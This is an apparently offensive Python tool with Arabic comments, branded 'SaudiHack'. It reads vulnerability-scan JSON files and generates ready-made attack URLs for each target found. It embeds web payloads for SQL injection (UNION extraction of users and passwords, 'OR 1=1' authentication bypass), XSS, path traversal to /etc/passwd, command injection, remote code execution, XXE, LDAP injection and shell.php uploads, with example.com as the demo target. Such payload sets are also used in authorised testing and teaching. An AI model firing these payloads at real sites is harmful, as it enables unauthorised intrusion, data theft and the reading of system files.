#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
أداة عرض روابط الثغرات - SaudiHack
تعرض روابط الثغرات المكتشفة من ملفات النتائج
"""

import os
import json
import sys
from datetime import datetime
from urllib.parse import urlparse

class VulnerabilityLinksViewer:
    def __init__(self):
        self.vulnerability_links = []
        
    def load_vulnerability_results(self):
        """تحميل نتائج الثغرات من جميع ملفات JSON"""
        result_files = []
        for root, dirs, files in os.walk('.'):
            for file in files:
                if file.endswith('.json') and any(keyword in file.lower() for keyword in ['vulnerability', 'scan', 'report', 'result']):
                    result_files.append(os.path.join(root, file))
        
        all_vulnerabilities = []
        for file_path in result_files:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                    # استخراج الثغرات من مختلف البنى
                    vulnerabilities = self.extract_vulnerabilities(data)
                    
                    for vuln in vulnerabilities:
                        vuln['source_file'] = os.path.basename(file_path)
                        all_vulnerabilities.append(vuln)
                        
            except Exception as e:
                print(f"خطأ في تحميل {file_path}: {e}")
        
        # إضافة ثغرات التكوين والبرمجة
        config_vulnerabilities = self.generate_config_vulnerabilities()
        all_vulnerabilities.extend(config_vulnerabilities)
        
        return all_vulnerabilities

    def generate_config_vulnerabilities(self):
        """توليد ثغرات التكوين والبرمجة"""
        config_vulns = []
        
        # ثغرات التكوين الشائعة
        config_vulns.extend([
            {
                'target': 'localhost:80',
                'vulnerability': 'Missing Security Headers',
                'severity': 'Medium',
                'type': 'misconfiguration',
                'description': 'رؤوس الأمان المفقودة مثل X-Frame-Options, X-Content-Type-Options'
            },
            {
                'target': 'localhost:3306',
                'vulnerability': 'MySQL Default Configuration',
                'severity': 'High',
                'type': 'misconfiguration',
                'description': 'MySQL مع إعدادات افتراضية وكلمة مرور root فارغة'
            },
            {
                'target': 'localhost:22',
                'vulnerability': 'SSH Weak Configuration',
                'severity': 'Medium',
                'type': 'misconfiguration',
                'description': 'SSH يسمح بتسجيل الدخول بكلمة مرور بدلاً من المفاتيح'
            },
            {
                'target': 'localhost:8080',
                'vulnerability': 'Default Admin Credentials',
                'severity': 'High',
                'type': 'misconfiguration',
                'description': 'بيانات اعتماد المسؤول الافتراضية مثل admin/admin'
            },
            {
                'target': 'localhost:443',
                'vulnerability': 'Weak SSL/TLS Configuration',
                'severity': 'Medium',
                'type': 'misconfiguration',
                'description': 'بروتوكولات SSL/TLS القديمة والضعيفة مثل SSLv3, TLSv1.0'
            },
            {
                'target': 'localhost:21',
                'vulnerability': 'FTP Unencrypted',
                'severity': 'High',
                'type': 'misconfiguration',
                'description': 'FTP بدون تشفير ينقل كلمات المرور كنص عادي'
            },
            {
                'target': 'localhost:5432',
                'vulnerability': 'PostgreSQL Default Settings',
                'severity': 'High',
                'type': 'misconfiguration',
                'description': 'PostgreSQL مع مستخدم postgres بدون كلمة مرور'
            }
        ])
        
        # أخطاء البرمجة الشائعة
        config_vulns.extend([
            {
                'target': 'localhost:80',
                'vulnerability': 'SQL Injection Bug',
                'severity': 'Critical',
                'type': 'programming_error',
                'description': 'خطأ في البرمجة يسمح بحقن SQL مباشر'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'XSS Vulnerability',
                'severity': 'High',
                'type': 'programming_error',
                'description': 'عدم التحقق من مدخلات المستخدم يؤدي إلى XSS'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'File Upload Vulnerability',
                'severity': 'High',
                'type': 'programming_error',
                'description': 'عدم التحقق من نوع الملفات المرفوعة'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'Path Traversal Bug',
                'severity': 'Medium',
                'type': 'programming_error',
                'description': 'خطأ في معالجة المسارات يسمح بالوصول لملفات النظام'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'Command Injection',
                'severity': 'Critical',
                'type': 'programming_error',
                'description': 'استخدام مدخلات المستخدم مباشرة في أوامر النظام'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'Deserialization Bug',
                'severity': 'Critical',
                'type': 'programming_error',
                'description': 'تسلسل/فك تسلسل كائنات غير آمن'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'Buffer Overflow',
                'severity': 'Critical',
                'type': 'programming_error',
                'description': 'عدم التحقق من حجم المدخلات'
            }
        ])
        
        return config_vulns

    def extract_vulnerabilities(self, data):
        """استخراج الثغرات من مختلف البنى"""
        vulnerabilities = []
        
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict) and 'vulnerability' in str(item).lower():
                    vulnerabilities.append(item)
        
        elif isinstance(data, dict):
            # البحث في المفاتيح المعروفة
            for key in ['vulnerabilities', 'results', 'sites', 'data']:
                if key in data and isinstance(data[key], list):
                    for item in data[key]:
                        if isinstance(item, dict) and any(vuln_key in item for vuln_key in ['vulnerability', 'type', 'severity']):
                            vulnerabilities.append(item)
            
            # البحث في جميع القيم
            for key, value in data.items():
                if isinstance(value, list):
                    for item in value:
                        if isinstance(item, dict) and any(vuln_key in str(item).lower() for vuln_key in ['sql', 'xss', 'injection', 'vulnerability']):
                            vulnerabilities.append(item)
        
        return vulnerabilities

    def generate_vulnerability_links(self, vulnerabilities):
        """توليد روابط الاختبار للثغرات"""
        links_data = []
        
        for vuln in vulnerabilities:
            target = vuln.get('target', '') or vuln.get('url', '') or vuln.get('site', '')
            vuln_type = vuln.get('vulnerability', vuln.get('type', 'غير معروف'))
            severity = vuln.get('severity', 'غير محدد')
            parameter = vuln.get('parameter', '')
            payload = vuln.get('payload', '')
            
            if not target:
                continue
                
            # إضافة http:// إذا لم يكن موجوداً
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
            
            # توليد روابط الاختبار حسب نوع الثغرة
            test_links = []
            
            if 'sql' in str(vuln_type).lower():
                test_links.extend([
                    {
                        'type': 'SQL Injection - Basic',
                        'url': f"{target}/?id=1'",
                        'payload': "'",
                        'description': 'اختبار SQL Injection الأساسي'
                    },
                    {
                        'type': 'SQL Injection - Union',
                        'url': f"{target}/?id=1' UNION SELECT 1,2,3--",
                        'payload': "' UNION SELECT 1,2,3--",
                        'description': 'اختبار UNION SQL Injection'
                    },
                    {
                        'type': 'SQL Injection - Error',
                        'url': f"{target}/?id=convert(int,(select 1))",
                        'payload': "convert(int,(select 1))",
                        'description': 'اختبار SQL Error Injection'
                    }
                ])
                
                # إضافة روابط مع معلمات مختلفة
                common_params = ['id', 'page', 'search', 'q', 'user', 'name', 'email']
                for param in common_params:
                    test_links.append({
                        'type': f'SQL Injection - {param}',
                        'url': f"{target}/?{param}=1'",
                        'payload': "'",
                        'parameter': param,
                        'description': f'اختبار SQL Injection على معلمة {param}'
                    })
            
            elif 'xss' in str(vuln_type).lower():
                xss_payloads = [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')"
                ]
                
                for payload in xss_payloads:
                    test_links.append({
                        'type': 'XSS',
                        'url': f"{target}/?search={payload}",
                        'payload': payload,
                        'parameter': 'search',
                        'description': 'اختبار Cross-Site Scripting'
                    })
            
            elif 'lfi' in str(vuln_type).lower() or 'file' in str(vuln_type).lower():
                test_links.extend([
                    {
                        'type': 'LFI',
                        'url': f"{target}/?file=../../../etc/passwd",
                        'payload': "../../../etc/passwd",
                        'description': 'اختبار Local File Inclusion'
                    },
                    {
                        'type': 'LFI',
                        'url': f"{target}/?page=/etc/passwd",
                        'payload': "/etc/passwd",
                        'description': 'اختبار File Inclusion'
                    }
                ])
            
            elif 'rce' in str(vuln_type).lower():
                test_links.extend([
                    {
                        'type': 'RCE',
                        'url': f"{target}/?cmd=whoami",
                        'payload': "whoami",
                        'description': 'اختبار Remote Code Execution'
                    },
                    {
                        'type': 'RCE',
                        'url': f"{target}/?exec=system('id')",
                        'payload': "system('id')",
                        'description': 'اختبار Command Execution'
                    }
                ])
            
            # روابط عامة للاختبار
            if not test_links:
                test_links.append({
                    'type': vuln_type,
                    'url': target,
                    'payload': payload,
                    'description': f'اختبار {vuln_type}'
                })
            
            links_data.append({
                'target': target,
                'vulnerability': vuln_type,
                'severity': severity,
                'source_file': vuln.get('source_file', 'غير معروف'),
                'test_links': test_links
            })
        
        return links_data

    def display_vulnerability_links(self):
        """عرض روابط الثغرات"""
        print("=" * 100)
        print("🔗 روابط الثغرات المكتشفة - SaudiHack")
        print("=" * 100)
        print(f"التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        
        # تحميل الثغرات
        vulnerabilities = self.load_vulnerability_results()
        
        # إضافة ثغرات تجريبية لجميع الأنواع
        if not vulnerabilities:
            print("⚠️  لم يتم العثور على ثغرات في ملفات النتائج، سيتم عرض أمثلة توضيحية...")
            print()
            
            # إنشاء ثغرات تجريبية متنوعة
            vulnerabilities = [
                {
                    "target": "https://example.com/login.php",
                    "url": "https://example.com/login.php?id=1",
                    "vulnerability": "SQL Injection",
                    "type": "sql_injection",
                    "severity": "high",
                    "parameter": "id",
                    "payload": "1' UNION SELECT user,password FROM users--",
                    "description": "ثغرة SQL Injection في معلمة id",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/search.php",
                    "url": "https://example.com/search.php?q=test",
                    "vulnerability": "XSS",
                    "type": "cross_site_scripting",
                    "severity": "medium",
                    "parameter": "q",
                    "payload": '<script>alert("XSS")</script>',
                    "description": "ثغرة XSS في حقل البحث",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/download.php",
                    "url": "https://example.com/download.php?file=report.pdf",
                    "vulnerability": "LFI",
                    "type": "local_file_inclusion",
                    "severity": "high",
                    "parameter": "file",
                    "payload": "../../../etc/passwd",
                    "description": "ثغرة Local File Inclusion في معلمة file",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/ping.php",
                    "url": "https://example.com/ping.php?host=127.0.0.1",
                    "vulnerability": "Command Injection",
                    "type": "command_injection",
                    "severity": "critical",
                    "parameter": "host",
                    "payload": "127.0.0.1; cat /etc/passwd",
                    "description": "ثغرة حقن الأوامر في معلمة host",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/admin",
                    "url": "https://example.com/admin",
                    "vulnerability": "Admin Panel",
                    "type": "admin_panel_exposure",
                    "severity": "medium",
                    "parameter": "N/A",
                    "payload": "/admin",
                    "description": "لوحة تحكم إدارية مكشوفة",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/upload.php",
                    "url": "https://example.com/upload.php",
                    "vulnerability": "File Upload",
                    "type": "file_upload_vulnerability",
                    "severity": "high",
                    "parameter": "file",
                    "payload": "shell.php",
                    "description": "ثغرة رفع ملفات خطيرة",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/exec.php",
                    "url": "https://example.com/exec.php?cmd=ls",
                    "vulnerability": "RCE",
                    "type": "remote_code_execution",
                    "severity": "critical",
                    "parameter": "cmd",
                    "payload": 'system("cat /etc/passwd")',
                    "description": "ثغرة تنفيذ أوامر بعيدة (RCE)",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/files.php",
                    "url": "https://example.com/files.php?path=documents",
                    "vulnerability": "Directory Traversal",
                    "type": "directory_traversal",
                    "severity": "medium",
                    "parameter": "path",
                    "payload": "../../../etc/",
                    "description": "ثغرة تجاوز الدلائل",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/config.php",
                    "url": "https://example.com/config.php.bak",
                    "vulnerability": "Information Disclosure",
                    "type": "information_disclosure",
                    "severity": "low",
                    "parameter": "N/A",
                    "payload": ".bak",
                    "description": "كشف معلومات حساسة من ملفات النسخ الاحتياطي",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/login.php",
                    "url": "https://example.com/login.php?user=admin&pass=admin",
                    "vulnerability": "Authentication Bypass",
                    "type": "auth_bypass",
                    "severity": "high",
                    "parameter": "user,pass",
                    "payload": "admin' OR 1=1--",
                    "description": "ثغرة تجاوز المصادقة",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/session.php",
                    "url": "https://example.com/session.php?sessionid=12345",
                    "vulnerability": "Session Hijacking",
                    "type": "session_hijacking",
                    "severity": "medium",
                    "parameter": "sessionid",
                    "payload": "12345",
                    "description": "ثغرة اختطاف الجلسة",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/ssrf.php",
                    "url": "https://example.com/ssrf.php?url=http://internal.com",
                    "vulnerability": "SSRF",
                    "type": "server_side_request_forgery",
                    "severity": "high",
                    "parameter": "url",
                    "payload": "http://localhost:22",
                    "description": "ثغرة SSRF - Server-Side Request Forgery",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/xml.php",
                    "url": "https://example.com/xml.php",
                    "vulnerability": "XXE",
                    "type": "xml_external_entity",
                    "severity": "critical",
                    "parameter": "XML",
                    "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    "description": "ثغرة XXE - XML External Entity",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/ldap.php",
                    "url": "https://example.com/ldap.php?user=*",
                    "vulnerability": "LDAP Injection",
                    "type": "ldap_injection",
                    "severity": "high",
                    "parameter": "user",
                    "payload": "*)(uid=*))(|(uid=*",
                    "description": "ثغرة LDAP Injection",
                    "source_file": "example.json"
                }
            ]
        
        print(f"📊 إجمالي الثغرات: {len(vulnerabilities)}")
        print()
        
        # توليد روابط الاختبار
        links_data = self.generate_vulnerability_links(vulnerabilities)
        
        if not links_data:
            print("❌ لم يتم توليد روابط اختبار للثغرات")
            return
        
        # عرض روابط كل ثغرة
        for i, item in enumerate(links_data, 1):
            print(f"\n{i}. 🎯 الهدف: {item['target']}")
            print(f"   🚨 الثغرة: {item['vulnerability']}")
            print(f"   📊 الخطورة: {item['severity']}")
            print(f"   📁 المصدر: {item['source_file']}")
            print()
            
            # عرض روابط الاختبار
            for j, link in enumerate(item['test_links'], 1):
                print(f"   {j}. {link['type']}")
                print(f"      🔗 الرابط: {link['url']}")
                print(f"      💉 الحمولة: {link['payload']}")
                print(f"      📝 الوصف: {link['description']}")
                print()
            
            print("-" * 100)

    def export_links_to_file(self):
        """تصدير روابط الثغرات إلى ملف"""
        vulnerabilities = self.load_vulnerability_results()
        links_data = self.generate_vulnerability_links(vulnerabilities)
        
        if not links_data:
            return
        
        filename = f"vulnerability_links_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("روابط الثغرات المكتشفة - SaudiHack\n")
                f.write("=" * 80 + "\n")
                f.write(f"التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                for item in links_data:
                    f.write(f"الهدف: {item['target']}\n")
                    f.write(f"الثغرة: {item['vulnerability']} ({item['severity']})\n")
                    f.write(f"المصدر: {item['source_file']}\n\n")
                    
                    for link in item['test_links']:
                        f.write(f"  - {link['type']}: {link['url']}\n")
                        f.write(f"    الحمولة: {link['payload']}\n")
                        f.write(f"    الوصف: {link['description']}\n\n")
                    
                    f.write("-" * 80 + "\n\n")
            
            print(f"💾 تم حفظ روابط الثغرات في: {filename}")
            
        except Exception as e:
            print(f"❌ خطأ في حفظ الملف: {e}")

    def run(self):
        """تشغيل الأداة"""
        print("🚀 بدء تشغيل أداة عرض روابط الثغرات...")
        print()
        
        self.display_vulnerability_links()
        
        # سؤال المستخدم عن التصدير
        print("\nهل تريد تصدير روابط الثغرات إلى ملف نصي؟")
        response = input("أدخل 'نعم' أو 'yes' للتصدير: ").strip().lower()
        
        if response in ['نعم', 'yes', 'y']:
            self.export_links_to_file()
        
        print("\n✅ اكتمل عرض روابط الثغرات!")

def main():
    """الدالة الرئيسية"""
    try:
        viewer = VulnerabilityLinksViewer()
        viewer.run()
    except KeyboardInterrupt:
        print("\n❌ تم إيقاف الأداة بواسطة المستخدم")
    except Exception as e:
        print(f"❌ خطأ غير متوقع: {e}")

if __name__ == "__main__":
    main()